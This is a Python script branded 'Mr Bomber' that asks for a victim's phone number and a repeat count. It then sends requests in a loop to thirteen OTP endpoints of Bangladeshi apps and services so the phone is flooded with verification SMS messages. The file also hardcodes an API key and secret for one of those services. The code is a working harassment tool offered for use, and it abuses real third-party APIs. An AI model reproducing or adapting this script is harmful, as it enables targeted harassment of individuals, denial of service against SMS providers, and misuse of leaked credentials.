import requests

from requests.structures import CaseInsensitiveDict

import os

import sys

import time


os.system("clear")

red="\033[0;31m"          # Red

yellow="\033[0;33m"       # Yellow

green="\033[0;32m"        # Green

color_off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black

bred="\033[1;31m"         # Red

ured="\033[4;31m"         # Red

on_green="\033[42m"       # Green

blue="\033[0;34m"         # Blue

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

end = '\033[0m'

purple="\033[0;35m"

logo=(green+""" 


██████╗░███████╗██████╗░██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
██████╔╝█████╗░░██║░░██║██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
██╔══██╗██╔══╝░░██║░░██║██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
██║░░██║███████╗██████╔╝██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝ """)
                                                  
cnt=(green+ """                     
   ╔═══════════════════════=══=════════╗
   	 Author   : MoJiB Rsm
  	 Facebook : MoJiB Rsm       								
 	 Github   : Mojib-Rsm
 	 YouTube  : Mojib Rsm
 	    
   ╚═══════════════════==══════════════╝  
""")




line=(yellow+"======================================================")
tversion=(cyan+"\t\t   Version : 1.0.1 ")

line2=("\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~")
 
dtls=(yellow+"\n\t Created By: Mojib Rsm & Team Member ")

MrBomber=(purple+"\n\t\t      MR BOMBER \n ")

note=(cyan+"Note: I wont be responsible fo any illigal activites. >>This Mr_Bomber Tool is for use in Bangladesh only.")

print(cnt)

print(" ")

print(dtls)

print(tversion)

print(MrBomber)
print(line)

print(note)

print(line)





print(' ')

number=str(input(red+" [➙] Enter Your Number : \t"))
amount=int(input(cyan+" [➙] Enter The Amount : \t"))

url1 = "https://ss.binge.buzz/otp/send/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone="+number



url2 = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/json"
headers2["Content-Length"] = "0"


url3 = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

url4 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"

headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json"

data4 = '{\"mobile\":\"'+number+'\"}'

url5 = "https://addabaji.mobi/twocups-v1-robi/otp.php"

headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/x-www-form-urlencoded"

data5 = "msisdn="+number

url6 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"

url7 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
headers7 = CaseInsensitiveDict()
headers7["Content-Type"] = "application/json"

data7 = '{"phone":"'+number+'","country_code":"+880","fcm_token":null}'

url8 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"

url9 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"


url10 = "https://ss.binge.buzz/otp/send/login"

headers10 = CaseInsensitiveDict()
headers10["Content-Type"] = "application/x-www-form-urlencoded"

data10 = "phone="+number


url11 = "http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number


url12 = "https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO="+number+"&countryPhoneCode=%2B88"


url13 = "http://robi.api.bongobd.com/api/login/send-otp"

headers13 = CaseInsensitiveDict()
headers13["Content-Type"] = "application/x-www-form-urlencoded"

data13 = "msisdn=88"+number+"&operator=all"


for i in range (amount):
	resp1 = requests.post(url1, headers=headers1, data=data1)
	resp2 = requests.post(url2, headers=headers2)
	resp3 = requests.get(url3)
	resp4 = requests.post(url4, headers=headers4,data=data4)
	resp5 = requests.post(url5, headers=headers5, data=data5)
	resp6 = requests.get(url6)
	resp7 = requests.post(url7, headers=headers7, data=data7)
	resp8 = requests.get(url8)
	resp9 = requests.get(url9)
	resp10 = requests.post(url10, headers=headers10, data=data10)
	resp11 = requests.get(url11)
	resp12 = requests.get(url12)
	resp13 = requests.post(url13)
		
	print(str(i+1)+green+'.	➙SMS Sent 😈✅ - Mr Bomber')
	
print('					')
print(cyan+'\t\tThanks For Using Mr_Bomber Bangladesh By Mojib Rsm - {Team Tiger} ')


